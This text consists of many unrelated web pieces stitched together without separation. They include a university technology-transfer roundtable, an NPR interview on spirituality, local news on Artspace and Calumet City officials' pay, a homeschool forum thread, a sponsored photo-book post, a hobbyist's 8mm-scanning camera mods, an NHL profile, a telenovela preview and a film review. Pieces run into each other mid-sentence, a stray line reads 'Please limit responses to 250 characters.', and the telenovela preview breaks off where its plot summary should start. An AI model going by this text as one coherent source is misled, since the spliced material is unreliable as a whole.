During the George H.W. Bush Sixth China-U.S. Relations Conference, global scientific and academic leaders from Texas A&M and Peking University Health Science Center shared how their institutions are approaching technology transfer and commercialization. As part of the international “think tank” sessions, participants discussed the challenges and opportunities that currently exist when translating new technologies from the laboratory into products for clinical use, and tangible solutions for overcoming barriers they face. The roundtable highlighted an overall effort at Texas A&M Health Science Center to accelerate biotechnology innovation and further explore opportunities for public-private and multinational partnerships – a measure that can not only help increase the number of technologies in development, but also decrease the time and cost associated with bringing them to market. In the case of a new drug or vaccine, which traditionally can take more than a decade and cost upwards of a billion dollars, such advances translates to hundreds of thousands of lives saved.
“We want to highlight the opportunities for building new partnerships that will streamline the commercialization process, and ultimately, accelerate the development of life-saving therapies to treat everything from cancer to emerging infectious diseases and other life-threatening conditions,” says LauraLee Hughes, director of the TAMHSC Office of Technology Translation, who chaired the roundtable discussion.
A crucial part of this dialogue includes assessing the current trends and models that are in place in countries around the world to facilitate technology translation, and then identifying how those can be impacted by factors such as the government, business climate, access to capital, and even ability to attract and maintain entrepreneurial talent.
In the U.S., biotechnology commercialization is increasingly characterized by multiple academic and medical institutions pooling their resources to collaborate with individual industry partners, and in China, government plays a strong role in providing funding to bring products to market, roundtable speakers said during a panel discussion.
This focus on public-private partnerships and multinational collaboration comes at a pivotal time, as university technology transfer offices are shifting their focus away from simply identifying discoveries, and toward protecting the intellectual property (IP) around those discoveries, before then licensing the IP to a third party for further development.
“We are seeing more and more academic institutions and technology transfer offices becoming involved in advanced development and translation, which often includes spinning out new companies to continue the development work that is required outside of an academic laboratory to bring new products to market,” Hughes says. “Often, they are also working with industry partners who are sponsoring development of a specific technology. In addition, many government agencies now offer specific incentives and programs that are focused on commercialization and provide funding to bring new technologies through intermediate and advanced phases of development on the path to the commercial market,” says Hughes.
New models are being pursued with the primary focus on improving public health, whether the technology in development is a preventive measure for chronic disease or a vaccine that the federal government keeps on hand for mass emergencies.
“Patients ultimately stand to benefit from these efforts that will impact how innovative research is brought to the clinic, and ideally will enable that to be done in a more cost-effective and timely manner,” says Hughes. “Achieving this goal requires a collective effort among universities, industry, government and other partners from across the world to ensure the most promising therapies reach the market and are able to have a positive impact on global public health.”]]>NPR's Barbara Bradley Hagerty spent a year exploring the science of spirituality for her book Fingerprints of God, and what she concluded was that science can't prove or disprove the existence of God.
"But there was something that I saw in interviewing dozens of scientists," Bradley Hagerty tells NPR's Michele Norris. "The science of spirituality is like a Rorschach test — that you can look at the evidence and come to opposite conclusions."
Bradley Hagerty says that a materialist would say a spiritual experience is just brain chemistry — or firings in the temporal lobe of the brain — and it's all explainable by material means. But someone else could look at the same evidence and say that people are wired to be able to connect with the divine and that brain chemistry is a reflection of an encounter.
Bradley Hagerty says she could have taken 10 more years to research the book.
"One of the great pleasures was interviewing people who have had spiritual experiences; it's not just the scientists," she says, adding she talked with Jews, Christians, Buddhists, Muslims, people who were spiritual but not religious. "One of the interesting things is what they described as a spiritual experience was basically the same: An encounter with light, an encounter with love, often an out-of-body experience. What that told me is spiritual experience is spiritual experience — it's a human phenomenon and in fact, it may be divine."Apple’s iPhone Turns 6 Today

As part of the Pentagon's Prompt Global Strike project, the X-51 is a hypersonic cruise missile that can strike anywhere in the world in less than an hour. The new missile, which is designed to hit Mach 5 (3,600 mph), destroys its targets by crashing into them at top speed. Tomahawks by comparison, top out at 550 mph. The Pentagon is hoping to test run the X-51 by 2008, despite protests that these missiles could trigger a nuclear war.

Jones was at a community meeting in downtown Augusta for nonprofit real estate developer Artspace on Wednesday night and said the concept of affordable artists’ space in Augusta sounds too good to be true, but he is willing to do what he can to make it happen.
“I think the real question will come down to, how serious is the city about it?” he said. “I’m certainly going to ring the bell for this every chance I get.”
Artspace, based in Minneapolis, works to assist development projects, asset management activities, consulting services, and community-building activities that serve artists and arts organizations across the U.S.
The organization is visiting Augusta by invitation of the city to explore the possibility of developing affordable space for artists to work and live.
While in Augusta, Artspace representatives toured potential locations and spoke with people from local groups ranging from bankers to artists.
Wednesday night’s meeting was heavily attended by members of the local arts community, who gave positive feedback, but were not optimistic, about the idea.
Wendy Holmes, a senior vice president of consulting and strategic partnerships, presented an overview of existing Artspace projects.
In Fergus Falls, Minn., the Kaddatz Artist Lofts converted a historic hotel into 10 housing units, 6,000 square feet of commercial space and an art gallery.
For a live-and-work space, low-income housing tax credits are used to fund the project. For all Artspace projects, government funding makes up about 80 percent of the total cost. The most important factor in getting a project started, she said, is enthusiasm and excitement.
“If you really want it to happen, a way will be found,” she said.
After their two-day trip to Augusta, Holmes and her colleague Joe Butler will put together a recommendation and findings report for Augusta city officials to review. At that point, she said, many conversations are necessary before anything begins.
“It’s not a short process,” she said.
Hooman Haghbin is a visual artist who has lived in Augusta for the past 10 years. He said that the local arts community has not seen a lot of support, and a project like this will be daunting to get off the ground.
“I think it’s overdue,” he said. “This is a step, and I think with the right support there’s a good possibility this will happen.”
Affordable space and community living for artists could potentially draw artists to move to the Augusta area, he said, not only helping local artists but growing the community in general.
“Maybe it will be like, if we build it they will come,” Haghbin said.Gunnerboy

I Am Afraid Of My Road Bike.

A few 'cross rides in now and the legs are used to going round and round and round again, the long slow drag up to where I once was is hard. There have been tired legs, there has been 'I used to be able to ride twice as far as this', there has been effort and reward. But it is now time to step up to the plate and get back on the road bike and an easy group ride with friends offers the perfect opportunity. A gentle ride along the coast taking in The Best Bit Of Tarmac Ever, turn round for home the pretty way via a pint in the pub.
Ah, it must be longer than I thought since I was last out on the road; the orthotic insets are still in the pimpy white Sidis that only come out when there's no chance of any moisture; no rain, and not a hint of puddle on the roads. Hmmm. Swap the inserts into the September-to-July shoes then.
I'm sure this bike was custom built to fit me, but at the moment it feels like I've borrowed someone else's big brothers bike, what are the bars doing all the way over there? And my hamstrings aren't enjoying things, at all. Should have stretched a bit maybe.
Ride with friends, play domestique, slipstream scaffold-lorries recklessly, ride The Best Bit Of Tarmac Ever both ways, stop for a pint and cheesy chips, and ride into the dark to go home the long way.

Okay, so it is only day 4 of our school year with my 4th grader, 1st grader and Kindergartener and once again, I’ve realized that the lofty ideas that I’ve planned out for the year may not be very practical. Anyone else do this?
I’ve planned Apologia for 4 days a week hoping to get through Swimming Creatures this year, but it really is alot of material to cover! We are doing Mystery of History, which I can tweak down to 3 days a week from its recommended 5 days with no problem, but with Apologia scheduled at 4 days and nature study on one day, our days are really long.
I am thinking of taking swimming creatures down to 2 days a week, but we’ll not finish the book this school year if I do. If you are using Apologia for elementary, do you pick and choose lessons instead of covering the whole book in order to keep the weekly lessons down? Do you do one book over 2 years (I really don’t want to do that)? Do you just have long lessons? How do you do it? I didn’t realize there would be so much material to cover.
Thanks!
LDIMomMember
I understand!!! We tried to cover TWO apologia books last year with my 3rd grader and 6th grader. We got it done but we had to cut out a lot of the hands-on stuff which really is one of the things we loved our first year using it. This year, we are doing just ONE book (Botany) which is MUCH shorter than Zoology 3. It is one of their longest books at around 250 pages. I just looked this morning when I made out our schedule and realized Botany is much shorter. We do science on Tuesday/Thursday. History on Monday-Thursday. We go to Community Bible Study on Friday mornings, and a LEGO group once a month on Friday afternoons so I gave up on doing anything else on Friday except our group morning time and CBS (and LEGO group or a trip to zoo or whatever else we feel like doing Friday PM).
I wouldn’t worry about it and would slow down (wish we had last year as I think we didn’t get the most out of it but I wanted older DS to get through all 3 Zoology books before moving on to Apologia General Science this year). I would also cut back the days if that is what will work best. One of the beauties of HSing; make changes as needed and better beginning of year than later.
JenniferMember
I started out thinking I’d do Apologia Anatomy with my boys up to 4 times a week. Then realized two is better. I thought I’d put Spanish on the schedule, and piano as well. But then I took them off.
I realize I need my schedule to consist of what I absolutely HAVE to do…the very minimum. Then, when I do those other things I can be happy that I excelled,
instead of looking at my schedule feeling like I failed. For me I’m homeschooling 3 school aged, 1 preschool, and a one year old. I don’t want to put too much pressure to get it all done and ruin the actual journey. They’ll learn tons and we’ll all be fine whether I do the minimum or if I add in the bells and whistles. It’s going to be a great year.
HeidiSMember
HAve you guys seen the lapbooking pages that go along with Apologia? I think I got mine from currclick and it made the whole year much more fun and more manageable as the lessons seem a bit shorter? Plus dd liked making little books about everything she was learning about so it made it much more pleasant for her and she was more engaged. We did this with Land Animals and we both enjoyed it a lot..
grace4todayMember
Heather, I actually finished the swimming creatures book in half a year with my fourth grader(I started it late)> I didnt really follow any daily lesson plan. Somedays we would read a little and other days she would ask me to KEEP GOING so we would read more. We did not read every day either. I think you will be able to finish it in a year doing 3 days a wk………..maybe just read a little more each day. I dont know if you use the CM planner but I just scheduled each chapter and marked “worked on” each day and then “finished” when we completed each chapter. Oh and I would give her more than one day to complete the notebook asignments too. Hope that helps,
sherazParticipant
So the notebook pages are really time-consuming? I am debating about which one to start with and got the notebook that comes with it from Apologia, but I don’t want to spend hours everyday doing science. I am trying to figure out how to schedule it – I was only wanting to do it twice a week but from everyone’s posts it sounds like three days a week is better, with extra time scheduled for notebooking?
csmammaParticipant
Have you seen Jeanies Notebooking Journals? She has recommended schedules in them – 2 days a week for 28 weeks. Blessings ~
grace4todayMember
I did not use the notebooking journal.I didnt know there was one till this year. I just used the notebooking suggestions at the end of each chapter and it was not too time consuming. Somedays my dd could finish it quickly other days she was just slower so we took more time to complete.I also shortened some of the assignments:)
HeatherMember
Thanks again ladies, I had scheduled it over 4 days per week, but found that I can double the lessons and get it down to 2 days pretty easily. I did this today and it worked just fine!
I printed the notebooking pages from the Apologia website and they are working well also. I am just picking and choosing which ones to do (there are so many!) and on days we choose not to workbook we just narrate orally.
Thanks again!
RenelleParticipant
Hi,
We only use our Apologia Zoology1 2 days per week & we have the notebooking journal as well, but I don’t expect a pile of work, we just use it as a method for narration or recording of science experiment facts and we pck and choose what we cover.
Warmest wishes Renelle

Another one that has extensive terrain for beginners and is a little closer to home is Cervinia. Located on the border of Switzerland and Italy, near the top of the Aosta Valley, Cervinia offers miles of long gentle runs and breathtaking views of the Matterhorn. The peak, just across the border into Switzerland, is over 3,600 metres – an altitude which guarantees good quality snow.
Cervinia is much cheaper than glitzy Zermatt and if the lift linking the two ski areas is open you’ve got yourself a real bargain and more advanced terrain to explore. Intermediates will enjoy themselves here too and the decent Indian Park will occupy freestylers.
The downside of Cervinia is that, with the exception of the magnificent Matterhorn, it’s a bit plain Jane and advanced riders may get bored. But like we said, it’s one for beginners.

Please limit responses to 250 characters.When Katey Dyck weighed 243 lbs, "I felt terrible about my body," she admits. "I hid from cameras."
Not anymore. The Fort Washington, Pennsylvania, native, 34, shed all those inhibitions when she dropped an astonishing 107 lbs.
To prove it, Dyck posed in a tiny two-piece in this week's issue of PEOPLE, which also features the transformations of four other PEOPLE readers who lost more than 100 lbs. each.
"I feel fit and strong for the first time," says the 5'8" stay-at-home mom. "It’s incredibly empowering."
In the past, Dyck struggled with portion control. "I could eat an entire tray of brownies," she says. "I love sugar like crazy!"
Her husband's deployment to Iraq in 2005 only exacerbated her poor eating habits. "I spent a year eating carb-heavy takeout because I missed him so much," she says.
Out of concern for her two kids, Natalie, 7, and Gabriel, 4, Dyck decided to turn her life around.
"I realized if something happened to me, my children wouldn't even remember me, " says Dyck, who, while admitting "I can have a nice big piece of cake at my child's birthday party," cut out sugar from her diet – and piled on the lean proteins.
She also works out six days a week, which has helped her maintain her weight loss for the past two years.

By Andrew Schroedter/BGA
November 23, 2012 12:56 PM
In Calumet City, the unemployment rate tops 11 percent, well above the state average.
Nearly 20 percent of local families live below the poverty line.
And taxes are rising to meet soaring pension costs for municipal workers.
The picture is relatively bleak – unless you’re an elected leader in town.
An analysis by the Better Government Association found the full-time mayor and seven part-time aldermen in Calumet City are the beneficiaries of unusually generous compensation, courtesy of the south suburb’s struggling tax base.
Among the BGA’s findings:
Last year, the mayor’s compensation included a salary of $74,194; a "longevity" bonus of nearly $20,000; a $500,000 life insurance policy with an annual premium of more than $20,000; an expense account of $19,500; about $16,660 in pension fund contributions; $11,000 for attending "special" meetings; a vehicle allowance of $7,740; $6,000 to handle liquor licenses; and at least $6,000 for health care coverage.
Qualkinbush’s pay and perks are expected to stay roughly the same this year.
Aldermanic compensation varies based on the length of time an alderman has been in office, among other factors, but in 2011 included an annual salary of nearly $16,000; up to $12,000 for "special meetings"; an $8,400 expense account; $6,000 to chair a committee; at least $6,000 for health care coverage; pension fund contributions of about $5,000; up to $4,000 in longevity bonuses; and $3,000 to cover life insurance.
In addition, each alderman is allowed to hire a personal secretary of his or her choice – and it’s often a relative. Each secretary receives pay of $7,200 a year, but no benefits.
The mayor and aldermen, and qualifying family members, aren’t required to pay premiums for health or dental coverage, though they pay deductibles or co-pays for prescriptions.
Even after they leave office, the mayor and aldermen, if they served at least two terms, can receive health care coverage with no premiums until they are eligible for Medicare; at that point, they and eligible family members can receive free "supplemental" insurance from the city.
Some of those benefiting from this largess acknowledge it’s been over the top, and city officials are scaling back certain perks.
For instance, in September Calumet City leaders changed the rules so city council members who take office after May 1, 2013, will no longer receive health insurance – but the current board won’t lose its coverage.
"It had to stop somewhere and it did," Ald. Thaddeus Jones.
Meanwhile, the city council also eliminated Qualkinbush’s vehicle stipend and slashed her expense allowance by about half. But those changes also won’t go into effect until next May.
Spared the chopping block were payments that Qualkinbush and aldermen receive for special meetings, held in addition to the regular bi-monthly city council meetings. Officials are paid $660 a meeting for the first 12 special meetings they attend in a year, then $330 for each special meeting thereafter..".

I was recently invited to participate in Snapfish’s “Your Creative Lens on Life” holiday campaign. I thought this may be the perfect solution for me and my files of photos so I was thrilled to be involved.
I also asked you to help me design a book. There were 10 bloggers participating in this campaign. The readers on each blog helped design a book. The 10 books will all be judged and a winning book will be chosen. The first 100 readers to comment on the design of winning blogs book will each get a $100 gift card credit from Snapfish! We are still waiting to hear who the winner is.
For the photo book, you can design a book online using your photos. You can do it all yourself if you have the time or, the part I liked, you can have Snapfish do it for you! So as part of the campaign, I had Snapfish do the design work for me.
You all had some terrific ideas on what to do for the photo book. I especially loved the idea from Nicole. She said: I am planning on making art books for each of my kids. Instead of saving all the paper that comes just scan each piece and add to a photo book for their own coffee table art books.
This was my favorite idea but with it being the Christmas season, I just didn’t have the time right now to scan in all of my kiddos stuff. So I went with the idea from Chalet who said: I just made a book of a trip that we took to Disneyland. With over 250 photos, it is a simple way to preserve those memories. And my daughter loves looking through it!
I had a file of photos hanging out on my computer from a Disneyland/Knott’s Berry Farm trip we took in 2006! So I uploaded the photos and selected the photo book I wanted. I selected an 8 x11 Classic photo book that starts at $24.99 and used their Modern Medley theme. That theme had 13 different backgrounds that included red, green, aqua and brown colors. I also chose the black linen cover.
Now this is the point where I handed off the design to Snapfish. It is $10 for their photo selection service. I sent them a bunch of photos and they picked the best ones to go in the book. Then it was $20 for them to design the book for me. I send off the stuff and they said they would have it ready for me to review in 3 business days.
Sure enough the book was ready for me to look at by the 3 days as stated. I looked it over and loved what they did. They even organized my jumbled mess of photos into the correct groupings too. All the things that were taken on one day where all grouped together in the book. It was like magic. I did even changed they way they did it. Only thing I added was some text. That was so easy.
Then I sent back the changes to Snapfish, they made them and sent it to me one more time for approval. It was ready to order. I had enough credit from Sanpfish that I could do another book so I decided to quickly throw one together of my daughter the year she was 4 based on the idea from Justin who said: My photobook design idea is to create a photobook for each year.
I went for the 8 x 11 book again and chose a purple linen cover. Then I found a cute Disney Princess theme. I went through page by page in the book adding the photos I wanted. I added some text too. It probably took me about an hour to lay it all out and it was ready to order. Now I just have to wait for both of the books to arrive in the mail. It was so easy.
Tonight I am also participating in a GNO Twitter party with Mom It Forward and Snapfish. We will be talking holiday photos and photo resolutions just in time to take those holiday photos! The party is tonight Tuesday, December 20 from 9 -11p.m. ET (8CT, 7MT, 6PT). There will also be a giveaway with the party! Stop by if you can and tell me Hi, it should be fun.

I have modified an 8mm projector to project one frame at a time under computer control, and then I trigger the camera's shutter to photograph that image. A typical 8mm film contains roughly 4800 frames.
Camera mod #1:
If Necessity is the mother of Invention, then her goofy sister is Stupidity. My mistake when I bought the camera was forgetting to make sure the shutter could be triggered remotely. Doh. I bought the service manual, disassembled my very expensive and new DLSR and soldered wires across the shutter switch so it could be triggered via relay.
Camera mod #2:
For this mod I blame the manufacturer who shall remain nameless but fittingly rhymes with HAMSTRUNG. An external power supply is listed among the accessories but they never actually made it, so I did.
Camera mod#3:
This is the biggie. For some reason I thought 'mirrorless' meant shutterless. One 8mm film is roughly 4800 shutter actuations and I had scanned about 40 films for a grand total of 192,000 images. I don't know what the shutter is rated for but after a while it started sticking and the camera would hang waiting for the shutter to finish actuating.
So I took it out! This involved removing the springs and solenoids that actuate the shutter and installing an Atmel ATTiny45 to convince the rest of the camera that the shutter was just fine thank you. I love Atmel.
Camera mod #4:
I started out projecting onto a screen and photographing but you end up with off-axis problems where the image is skewed. I finally got the spine to mount the camera directly facing the project but the lens couldn't focus close enough.
So I took it out! Now the projector projects directly onto the image sensor. The camera was complaining that it didn't have a lens but it turns out that a simple microswitch so that was easily shorted out.
Detailed Instructions:
1. Carefully research available camera options, paying attention to sensor size, low-light performance, maximum SD card capacity and manual control options.
2. Purchase and receive camera.
3. Slap forehead upon realization that it doesn't have remote shutter control.
4. Buy the service manual, take a deep breath and bust out the soldering iron.
4a. Pause for brief moment of pride.
5. Slap forehead upon realization that the external power supply accessory is a FICTION, build external power supply.
6. Repeat step 4a.
7. Modify 8mm projector, write code and connect relay to camera, build software workflow.
8. Take 192,000 pictures.
9. Slap forehead upon realization that your mirrorless camera still has a mechanical shutter and it's wearing out.
10. Take several deep breaths, dig out your oscilloscope and logic analyzer, hack up your expensive and delicate camera, program an ATTiny45 and shove it back in there.
11. Repeat step 4a twice.
12. Get an enlarger off of freecycle.org and use it to make a bracket for mounting the camera.
13. Remove the lens, put a solder blob across the switch that says whether there's a lens or not.
14. Take lots more pictures.
15. Repeat step 4a as necessary.Dryer Vent Wizard of Northern Nevada

Second-year defenseman Zach Bogosian played though a wrist problem for much of last season. Now healthy, he is ready for a big season in Atlanta.
This unlucky occasion, however, proved to be the 19-year-old Atlanta Thrashers own personal Halloween nightmare, ruining what was shaping up to be a fabulous sophomore season.
Playing against the Senators in Ottawa last Oct. 31, the No. 3 pick in the 2008 Entry Draft fell behind the net and hit his left hand on the iron. Then someone fell on top of it.
Bogosian's thumb was broken and his wrist was injured. Bogosian, a righty-shooting defenseman whose wrist shot had produced 8 goals in his first 17 games -- tops among all NHL defensemen -- could no longer generate any power with his top hand.
He ended up playing through the injuries -- something he later said he should not have done -- missing only one game all season. But instead of reacting and firing the puck at the net as he naturally would have done, he had to think about how he would play the puck, usually a pass because of his ineffectual shot -- and in a game like hockey that allows only milliseconds to make decisions, his game and his confidence began to unravel.
Bogosian said it was "definitely a tough year."
"I didn't play at 100 percent at all last year" after the injury, he said. "I was still feeling it at the end of the year. The only way an injury like that is going to get better is with rest, and time was not really something I wanted to take off. I just wanted to keep at it.
"It's not like it was a career-ending, career-threatening injury. It was something that if I battled through it, it'd be OK. It was hard in like December and January and stuff, but the pain eased by the end of the year. But I was never 100 percent."
In the two weeks following the injury, he somehow scored three times in his next seven games and even had a plus-4 night at Los Angeles. Maybe it was adrenaline.
But he couldn't sustain it. Over his final 64 games, Bogosian totaled just 2 goals and 11 assists and was minus-17. Yet Bogosian kept mum about the injury until April.
When a player gets injured and attempts to play through it, he sometimes unwittingly causes another injury by compensating too hard. In this case, Bogosian hurt his confidence.
"Personally, you're sitting there and everyone's talking about how bad or this game or that game, but really they're not feeling the pain," he said. "They don't really know what it's like. But obviously, at the beginning of the year, I got off to the good start. I mean, there wasn't any more pressure on me than what I put on myself."
He said teammates supported him in the locker room, but it could not have helped that before the injury Bogosian was mentioned as a candidate to make the U.S. Olympic team. He was not selected.
Meanwhile, the player selected ahead of him in his draft year, Los Angeles defenseman Drew Doughty (second overall in 2008), went on to star for gold medal-winning Team Canada and finished third in the Norris Trophy balloting.
Comparisons are inevitable. Thrashers defenseman Ron Hainsey, Bogosian's partner for much of last season, made that comparison unsolicited.
"It hampered him a lot of the year, but it is what it is," Hainsey said when asked if he thought Bogosian would rebound from the injury. "We'll see. It's going to be a little different here with the new staff. It's a learning process on defense. Not everybody 18 or 19 -- it's unfair to compare, but Doughty was such a dominant player for Canada and they were drafted so close together -- but it doesn't always work like that.
"He'll be fine. He's got all the tools to be a great player. It's just putting them all together, staying healthy, obviously. He's on the right track, so no point putting too much pressure on him, but he'll be fine."
When the season ended, Bogosian remained in Atlanta for several months working out. He did wrist curls in an effort to strengthen the injured wrist and try to prevent future injury.
He left for a few weeks, visiting his family in Western New York, and now he's back at the Thrashers' practice facility several weeks early, skating with his teammates to prepare for the year.
In a short meeting, Ramsay discussed what he has in store for Bogosian.
"I think one of the things he stressed on the other day was instead of me going in and kill someone, or trying to go for the big hit, trying to contain," Bogosian said. "You don't want to go for a big hit in your own zone because then the guy can spin off you and can walk in and score.
"So different things like that. I just want to learn the game. I want guidance and I'm all for it. I want to do a lot of things I haven't done in the past, like video and stuff like that."
A criticism leveled at the Thrashers' former coaching staff by outgoing veteran Slava Kozlov last April was that the team did not do enough video work and was not prepared. Bogosian said he was looking forward to working with Ramsey, who was hired after John Anderson was let go.
"It was a little tough," he said. "Every coach has their different ways of teaching, and I think that the way Craig will be with me, from what I've heard, it will be good for me to do a lot of video and stuff like that."
Hainsey recalled when he left Montreal for Columbus and had the good fortune to play for Stanley Cup winner Ken Hitchcock, one of the game's preeminent teachers of defensive hockey.
"I don't know most of those guys [on the Thrashers' new coaching staff], but I know they really plan on being teachers," Hainsey said. "That's something that can only help. From my own experience, once I got to Columbus and had Hitchcock there, he was the master teacher -- or whatever -- it turned my career around. It really did ... It's usually defenseman who have a little more of a learning curve.
"If you take advantage of it and take it in, great things can happen."
Bogosian said whether it's scoring 20 goals or blocking shots, he just wants to do whatever he must to help the team make the playoffs. In that regard, he thinks his influx of new teammates from the Chicago Blackhawks will help, as will the arrival of free-agent goalie Chris Mason from St. Louis.
But if Bogosian can transform himself into the dominating No. 1 defenseman he was drafted to be, that could help as much as anything.
"As long as he's improving and getting better -- he's already our best skater; he has been since he got here," Hainsey said. "Once the other stuff catches up, the sky's the limit. It really is."
Author: John Manasso | NHL.com CorrespondentTelenovela watchers in the US may be experiencing bouts of déjà vu of late due to the current lamentable trend at Televisa of producing Mexican adaptations of recent Colombian telenovelas. Here in the US, we got LA HIJA DEL MARIACHI (countlessly rerun), EL SECRETARIO (on Telemundo), and LOS CANARIOS (on SoiTV) well before their Mexican counterparts aired on Univision.
It’s déjà vu all over again tonight with the premiere of QUÉ POBRES TAN RICOS at 10 p.m. ET on Univision. The Colombian original, POBRES RICO, played in the US in 2012 on MundoFox. Starring Juan Pablo Raba and Paola Rey, and featuring enjoyable supporting performances from Maria Helena Doering, Carlos Torres, Diego Vásquez, and Luisa Fernanda Giraldo, POBRES RICO was a cute, amiable mediocrity. As the title suggests, it was a fairly cliché rich meets poor story. There was a single truly funny performance from Doering as the frivolous, haughty, alcoholic mother of the hero who loved her show dogs more than her kids. There was certainly nothing about POBRES RICO that clamored to be done again, but that has not deterred Televisa.
QUÉ POBRES TAN RICOS is produced by Rosy Ocampo, who, in her last three telenovelas, has another adaptation of a Colombian comedy, POR ELLA SOY EVA, sandwiched between a pair of good original melodramas from María Zarattini, LA FUERZA DEL DESTINO and MENTIR PARA VIVIR. I personally much prefer the two melodramas, but it was the comedy which was the hit in the US. And to be fair, I find Ocampo’s comedy adaptations far more bearable than any of her Televisa cohorts, there is some semblance of taste and intelligence at work in them, they are all painlessly watchable as opposed to a monstrosity like PORQUE EL AMOR MANDA.
The story of QUÉ POBRES TAN RICOS from the press release: "The snobby Ruiz-Palacios family has spent a lifetime trying to disprove the cliché that says money can’t buy happiness. Their frivolous world revolves around wealth and status – until the fateful day they find out that their fortune has vanished.
In dire financial straits, the Ruiz-Palacios are forced to move in with a working class family on the ‘poor’ side of town, where they struggle to adapt to a life without luxuries. Making the transition from caviar to frijoles proves agonizing, and their goodhearted co-residents, the Menchacas, must deal with their ridiculously spoiled ways – which creates a myriad of hilarious situations."
The rich-poor protagonists are Jaime Camil (POR ELLA SOY EVA) as the stuck-up Miguel Ángel Ruiz-Palacios and Zuria Vega (UN REFUGIO PARA EL AMOR) as the down-to-earth Lupita Menchaca. The cast also features Mark Tacher (ABISMO DE PASIÓN), Ingrid Martz (CORAZÓN INDOMABLE), Arturo Peniche (QUÉ BONITO AMOR), Manuel "Flaco" Ibáñez (LA MUJER DEL VENDAVAL) as the former wrestler patriarch of the Menchaca family, Tiaré Scanda, Agustín Arana and Sylvia Pasquel (YO AMO A JUAN QUERENDÓN) in the frivolous, dog-toting mother role.

The plot from Telemundo’s press release: .[23 April 2007]
PopMatters Film and TV Editor
Knowledge is pain. I’m used to that. Not that I don’t get some little pleasures returned from the pain.
—Ted (Anthony Hopkins)
Assigned to what seems an easy murder case, a young L.A. Deputy DA named Willy (Ryan Gosling) is distracted. Recently handpicked to join a glossy downtown firm that specializes in brilliant defenses for wealthy clients, he imagines this will be his last case for the prosecution. Willy arrives at the crime scene with cell phone in hand, trying to parse the finer points of office décor. “What’s the difference between Italian and English?” he wonders, while the nearby detectives roll their eyes. When at last Willy notices the tastefully designed space around him, he turns to Detective Flores (Cliff Curtis), asking what he would call it. The cop’s response is impeccably deadpan: “Homicidal modern.”
Flores (thanks largely to Curtis’ sly performance) provides the single freshness in Fracture. Part police procedural, part courtroom hijinks, and part cunning murder plot, Gregory Hoblit’s new movie brings the usual canards. Willy learns a lesson about ego, power, and morality, owing to the killer Ted’s (Anthony Hopkins) predictable underestimation of his adversary. That they face off over a woman’s body only underlines the film’s grim dearth of imagination.
The initial violence is delivered via stylish lighting and skewed camera angles. Aware that his wife Jennifer (Embeth Davidtz, excellent in Hoblit’s excellent Fallen [1998]) is sleeping with another man, Ted confronts her in their “homicidal modern” living room. She goes down in fabulous fashion: shot in the face, her collapse appears from several angles and in slow motion, dark blood pooling beneath as Ted drags her body about, arranging the scene just so. He goads the first cop on scene, Rob (Billy Burke), who happens to be Jennifer’s lover. Aha, you surmise, a trap is being set. Now you only have to figure its specifics, a task that proves more difficult for the brilliant Deputy DA than it does for you. His slow uptake could be a function of his being distracted, as Fracture displays repeatedly, but more likely it’s a function of your having seen this movie before.
Consider the Hannibal Lecterness of Ted. The visual rhymes are immediate, of course, sharply underlit close-ups denoting evil intent, his vocal rhythms a musty “intelligence” (he likes to call Willy “old sport”). Ted first espies his mark in the preliminary hearing—Willy arrives late, wearing a tux (the reason is not even mildly diverting or convincing, though it does lead to the film’s single laugh-out-loud line, delivered precisely by the brilliant Xander Berkeley as the judge: “I appreciate your concern for the dignity of the court, 007”). Ted goes pro se, and the contest is on. He’s arranged that his confession will be inadmissible, as will the seeming “slam dunk” evidence, such that Willy must scramble to fix the mess, lest he lose his new job even before he arrives in his newly decorated office.
Willy is especially motivated when he meets his new boss, Nikki (Rosamund Pike). She promises him a “trial by fire” in his first case for her firm, flirts with him audaciously while (or, more accurately, by) wondering out loud why her own boss has selected the upstart, then invites him into her bed to boot. She’s pretty and well appointed, clever and coy in a control freaky kind of way. Thus the utter illogic of her inviting Willy to Thanksgiving at her parents, an event that she warns him is troubling for her. He goes along, being the sort of workaholic (as a DDA, he has a 97% conviction rate, a number of which you’re reminded more than once) who has no friends or family. He’s also apparently looking to be the next incarnation of Keanu Reeves in The Devil’s Advocate; in case you’re determined to miss this allusion, Nikki pronounces it when she reminds Willy to sign the contract “with the devil in blood,” revealing that her sense of humor is as dated as her purpose in the plot.
Ryan Gosling stars as “Willy Beachum”
But the invite is not illogical within the film’s awkward scheming, but rather, a means to demonize her further: her siblings are noble and sweetly anti-corporate, working for the Sierra Club and ACLU, her father, a wise and moral-minded judge (Bob Gunton) who proposes a reason Willy might want to remain a lowly civil servant rather than take up with darling Nikki: “Every once in a while,” he smiles, “you get to put a fucking stake through a bad guy’s heart.” The judge instantly becomes a more compelling model for Willy than his ostensible girlfriend and mentor (Nikki tells him early on that she’s more of a “probation officer,” a joke he predictably doesn’t take seriously enough).
Nikki, being so transparent, actually does not provide much distraction for the eminently distractible Willy. Thus he focuses quickly on his proper object of dread and attraction, Ted. In an effort to obtain a witness against Ted, Willy heads to the hospital and sits by the comatose Jennifer’s bedside, reading to her in hopes that she will awaken. An observant resident (Judith Scott) advises Willy the patient’s twitching is in fact meaningless: “They all move,” she says, “It’s just what’s left of the system.”
It’s an almost smart line, conflating Jennifer’s inert body with the legal system that’s about to let Ted off. But the conflation is precisely what’s wrong with the oddly titled Fracture. The focus on Willy’s ethical and emotional education argues that, for all the system’s brokenness, civil service is noble. The judge notes it, as does the DA (David Strathairn), who insists Willy has something like a proclivity to do the right thing, manifested in that conviction rate. It might also mean, of course, that he’s inclined to compete, play boy games, and “move on up,” as he believes he deserves (“I just didn’t work this hard to stay where I belong,” he whines, by way of explaining his ambition).
But Willy and the movie don’t take a next step except when forced, as when the plot demands a moralizing reveal that grants Willy (and the system) an insipid victory over the villain. Tellingly, he reaches this moment during a bit of non-conversation with Flores. Intermittently, the detective has observed the dire nature of the case, the impossible lack of evidence, the abjection it brings down upon his partner Rob. Standing just outside the sense of obligation and anxiety that drives Willy, Flores maintains a practical grasp of the situation, his detachment both persuasive and instantly recognizable. You know why: he, like you, has seen this movie before.

Morse said that after hunting with friends last October on the Middle Fork of the Salmon River, his best friend's son wounded a deer about 250 yards away but was out of shells and the animal was about to get away. He said he shot and believes he hit the deer to bring it down in order to prevent wasteage. He has been ordered to serve 40 hours community service and has paid almost $600 in fines.The way we produce, manage, and use water is being forced to change and this is impacting governments, corporations, and citizens around the world. This drastic transformation in the water industry will create unprecedented investment opportunities as water transitions from a simple life sustaining substance which many have taken for granted, into one of the most economically and socially valuable resources of the 21st century.
